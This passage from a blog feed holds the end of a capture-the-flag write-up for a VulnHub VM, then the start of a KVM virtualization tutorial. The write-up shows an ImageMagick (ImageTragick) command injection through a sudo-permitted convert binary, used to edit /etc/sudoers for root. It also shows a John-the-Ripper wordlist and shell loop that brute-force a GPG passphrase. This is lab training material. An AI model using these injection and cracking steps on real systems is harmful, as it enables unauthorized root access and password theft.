<li>VNC is running on the localhost:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               </span></code></pre></td></tr></table></div></figure>


<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User margo may run the following commands on gibson:
</span><span class='line'>    (ALL) NOPASSWD: /usr/bin/convert</span></code></pre></td></tr></table></div></figure>


<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ /usr/bin/convert
</span><span class='line'>Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
</span><span class='line'>Copyright: Copyright (C) 1999-2012 ImageMagick Studio LLC
</span><span class='line'>Features: OpenMP    
</span><span class='line'>
</span><span class='line'>Usage: convert [options ...] file [ [options ...] file ...] [options ...] file
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png</span></code></pre></td></tr></table></div></figure>


<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># User privilege specification
</span><span class='line'>root    ALL=(ALL:ALL) ALL
</span><span class='line'>
</span><span class='line'>margo    ALL=(ALL:ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>Also, some other interesting tidbits in the the sudoers file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Allow members of group sudo to execute any command
</span><span class='line'>## disabled after Margo's security incident
</span><span class='line'>##%sudo ALL=(ALL:ALL) ALL
</span><span class='line'>
</span><span class='line'># Allow Margo to convert pictures from the FTP server
</span><span class='line'>margo ALL=(ALL) NOPASSWD: /usr/bin/convert
</span><span class='line'># Allow eugene to manage virtual machines and visudo
</span><span class='line'>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
</span><span class='line'>eugene ALL=(ALL:ALL)  /usr/sbin/visudo</span></code></pre></td></tr></table></div></figure>


<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
</span><span class='line'>convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
</span><span class='line'>convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
</span><span class='line'>margo@gibson:~$ sudo su
</span><span class='line'>[sudo] password for margo: 
</span><span class='line'>root@gibson:/home/margo# </span></code></pre></td></tr></table></div></figure>


<p></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@gibson:~# virsh list --all
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> 2     ftpserv                        running</span></code></pre></td></tr></table></div></figure>


<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /var/lib/libvirt/images/
</span><span class='line'>ftpserv.img</span></code></pre></td></tr></table></div></figure>


<p>To transfer the VM using scp, I first needed to enable SSH&#8217;ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin yes 
</span><span class='line'>AllowUsers eugene margo root
</span><span class='line'>Match user root
</span><span class='line'>    PasswordAuthentication yes</span></code></pre></td></tr></table></div></figure>


<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
</span><span class='line'>Ubuntu 14.04.3 LTS
</span><span class='line'>root@192.168.217.148's password: 
</span><span class='line'>ftpserv.img                                   100%  512MB  22.6MB/s   00:22    </span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file ftpserv.img 
</span><span class='line'>ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors</span></code></pre></td></tr></table></div></figure>


<p>To mount it, we need to learn the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l ftpserv.img 
</span><span class='line'>Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: dos
</span><span class='line'>Disk identifier: 0x00000000
</span><span class='line'>
</span><span class='line'>Device       Boot Start     End Sectors   Size Id Type
</span><span class='line'>ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)</span></code></pre></td></tr></table></div></figure>


<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir ftpserv
</span><span class='line'>mount -o loop,offset=32256 ftpserv.img ftpserv</span></code></pre></td></tr></table></div></figure>


<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls ftpserv
</span><span class='line'>AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
</span><span class='line'>BOOTSECT.BIN  DOS          GARBAGE       net</span></code></pre></td></tr></table></div></figure>


<p>The GARBAGE directory seems interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls GARBAGE/
</span><span class='line'>adminspo.jpg  flag.img  jz_ug.ans</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/gibson/adminspo.jpg" title="sysadmin" alt="sysadmin life"></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool adminspo.jpg 
</span><span class='line'>ExifTool Version Number         : 10.60
</span><span class='line'>File Name                       : adminspo.jpg
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 120 kB
</span><span class='line'>File Modification Date/Time     : 2016:05:04 17:17:44-04:00
</span><span class='line'>File Access Date/Time           : 2017:10:01 15:14:34-04:00
</span><span class='line'>File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
</span><span class='line'>File Permissions                : rwxr-xr-x
</span><span class='line'>File Type                       : JPEG
</span><span class='line'>File Type Extension             : jpg
</span><span class='line'>MIME Type                       : image/jpeg
</span><span class='line'>Exif Byte Order                 : Big-endian (Motorola, MM)
</span><span class='line'>Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
</span><span class='line'>Modify Date                     : 2016:05:04 22:29:32
</span><span class='line'>Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
</span><span class='line'>User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>Next I looked at the ANS file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file jz_ug.ans 
</span><span class='line'>jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences</span></code></pre></td></tr></table></div></figure>


<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat jz_ug.ans 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����
</span><span class='line'>    �����������������������������������������������������۲���������������
</span><span class='line'>    �������������������������۲���������� ��������۲�����۲���������������
</span><span class='line'>    ���������������������������������������������������� �����������������
</span><span class='line'>    ޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
</span><span class='line'>     ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
</span><span class='line'>                                  �                            �         �
</span><span class='line'>                    the ugliest of all are under 5 feet tall</span></code></pre></td></tr></table></div></figure>


<p>Hmm, ok. Finally, another image file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file flag.img 
</span><span class='line'>flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121</span></code></pre></td></tr></table></div></figure>


<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount ftpserv/GARBAGE/flag.img flag
</span><span class='line'>ls -la
</span><span class='line'>total 70
</span><span class='line'>drwxr-xr-x 4 root root  1024 May 14  2016 .
</span><span class='line'>drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
</span><span class='line'>-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
</span><span class='line'>-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
</span><span class='line'>-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
</span><span class='line'>drwx------ 2 root root 12288 May  5  2016 lost+found
</span><span class='line'>drwxr-xr-x 2 root root  1024 May  5  2016 .trash</span></code></pre></td></tr></table></div></figure>


<p>Davinci is a snake game:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>     _________         _________             
</span><span class='line'>     /         \       /         \            
</span><span class='line'>    /  /~~~~~\  \     /  /~~~~~\  \           
</span><span class='line'>    |  |     |  |     |  |     |  |           
</span><span class='line'>    |  |     |  |     |  |     |  |           
</span><span class='line'>    |  |     |  |     |  |     |  |         / 
</span><span class='line'>    |  |     |  |     |  |     |  |       //  
</span><span class='line'>   (o  o)    \  \_____/  /     \  \_____/ /   
</span><span class='line'>    \__/      \         /       \        /    
</span><span class='line'>      |        ~~~~~~~~~         ~~~~~~~~         
</span><span class='line'>      ^                               
</span><span class='line'>      Welcome To The Snake Game!          
</span><span class='line'>              Press Any Key To Continue...    
</span></code></pre></td></tr></table></div></figure>


<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
</span><span class='line'>http://www.imdb.com/title/tt0117951/ and
</span><span class='line'>http://www.imdb.com/title/tt0113243/ have
</span><span class='line'>someone in common... Can you remember his
</span><span class='line'>original nom de plume in 1988...?</span></code></pre></td></tr></table></div></figure>


<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l
</span><span class='line'>total 317
</span><span class='line'>---x------ 1 root root    469 May 14  2016 flag.txt.gpg
</span><span class='line'>-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg</span></code></pre></td></tr></table></div></figure>


<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat tries.txt 
</span><span class='line'>zero cool
</span><span class='line'>zerocool
</span><span class='line'>zero kool
</span><span class='line'>zerokool</span></code></pre></td></tr></table></div></figure>


<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
</span><span class='line'>Created directory: /root/.john
</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class='line'>1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL</span></code></pre></td></tr></table></div></figure>


<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt</span></code></pre></td></tr></table></div></figure>


<p>Now add the rules to John&rsquo;s config file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to generate the file with p@$$w0rd$:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class='line'>132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1</span></code></pre></td></tr></table></div></figure>


<p>And a quick shell script for bruteforcing from the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for pass in $(cat coolpass.txt) ; do
</span><span class='line'>  echo "Trying:" $pass
</span><span class='line'>  gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
</span><span class='line'>  if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
</span><span class='line'>  break
</span><span class='line'>  fi
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>


<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Trying: Z3r0K00l
</span><span class='line'>gpg: CAST5 encrypted data
</span><span class='line'>[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
</span><span class='line'>gpg: encrypted with 1 passphrase
</span><span class='line'>[GNUPG:] BEGIN_DECRYPTION
</span><span class='line'>[GNUPG:] DECRYPTION_INFO 0 3
</span><span class='line'>[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
</span><span class='line'>[GNUPG:] PLAINTEXT_LENGTH 862
</span><span class='line'>[GNUPG:] DECRYPTION_OKAY
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>[GNUPG:] END_DECRYPTION
</span><span class='line'>Passphrase found! Z3r0K00l</span></code></pre></td></tr></table></div></figure>


<p>And the flag is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag.txt
</span><span class='line'> _   _            _      _____ _             ____  _                  _   _
</span><span class='line'>| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
</span><span class='line'>| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
</span><span class='line'>|  _  | (_| | (__|   &lt;    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
</span><span class='line'>|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Should you not be standing in a 360 degree rotating payphone when reading
</span><span class='line'>this flag...? B-)
</span><span class='line'>
</span><span class='line'>Anyhow, congratulations once more on rooting this VM. This time things were
</span><span class='line'>a bit esoteric, but I hope you enjoyed it all the same.
</span><span class='line'>
</span><span class='line'>Shout-outs again to #vulnhub for hosting a great learning tool. A special
</span><span class='line'>thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
</span><span class='line'>to host the CTF once more.
</span><span class='line'>                                                              --Knightmare</span></code></pre></td></tr></table></div></figure>


<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Q: Why is Christmas just like a day at \
</span><span class='line'>| the office? A: You do all of the work  |
</span><span class='line'>| and the fat guy in the suit            |
</span><span class='line'>|                                        |
</span><span class='line'>\ gets all the credit.                   /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KVM virtualization on Linux hosts]]></title>
    <link href="http://chousensha.github.io/blog/2017/09/24/kvm-virtualization-on-linux-hosts/"/>
    <updated>2017-09-24T11:34:34-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/09/24/kvm-virtualization-on-linux-hosts</id>
    <content type="html"><![CDATA[<p>By now you probably noticed that the last topics were centered more around Linux than the usual. That&rsquo;s because I am studying for my LFCS certification, and creating posts as I go through the material. This time, we&rsquo;re going to look at using virtualization on a Linux physical host. Since my only physical Linux at the moment is Kali, this is what I&rsquo;m going to use for today&rsquo;s post.</p>

<!-- more -->


<p>The first step before starting anything else, is to check if virtualization is enabled on your machine. For this, you can query your <code>/proc/cpuinfo</code> file and look for the following flags:</p>

<ul>
<li><p><strong>vmx</strong> for Intel CPUs</p></li>
<li><p><strong>svm</strong> for AMD CPUs</p></li>
</ul>


<p>I already knew the result in my case, but I checked anyway with <code>grep &mdash;color vmx /proc/cpuinfo</code>:</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/vmx.png" title="vmx" alt="vmx enabled"></p>

<p>Ok, the next step is to install the virtualization utilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install qemu-kvm virt-manager libvirt0 qemu-system virt-viewer virt-top</span></code></pre></td></tr></table></div></figure>


<p>KVM (Kernel Virtual Machine) is a full virtualization solution for Linux on x86 and x64 hardware containing virtualization extensions (Intel VT or AMD-V). It consists of a loadable kernel module, kvm.ko, that provides the core virtualization infrastructure and a processor specific module, kvm-intel.ko or kvm-amd.ko.</p>

<p>libvirt is an API toolkit for managing virtualization hosts</p>

<p>The virt-manager application is a graphical tool for managing virtual machines through libvirt. It primarily targets KVM VMs, but also manages Xen and LXC (linux containers).</p>

<p>virt-viewer allows access to the virtual machine console</p>

<p>virt-top is for monitoring VMs performance</p>

<p>After installing everything, you can go to <code>/etc/libvirt/qemu/networks</code> and look inside the <strong>default.xml</strong> file to see how the default virtual network will be configured:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--
</span><span class='line'>WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
</span><span class='line'>OVERWRITTEN AND LOST. Changes to this xml configuration should be made using:
</span><span class='line'>  virsh net-edit default
</span><span class='line'>or other application using the libvirt API.
</span><span class='line'>--&gt;
</span><span class='line'>
</span><span class='line'>&lt;network&gt;
</span><span class='line'>  &lt;name&gt;default&lt;/name&gt;
</span><span class='line'>  &lt;uuid&gt;d67cdb82-233e-44f1-a6ac-9293faa2258d&lt;/uuid&gt;
</span><span class='line'>  &lt;forward mode='nat'/&gt;
</span><span class='line'>  &lt;bridge name='virbr0' stp='on' delay='0'/&gt;
</span><span class='line'>  &lt;mac address='52:54:00:b2:a7:6e'/&gt;
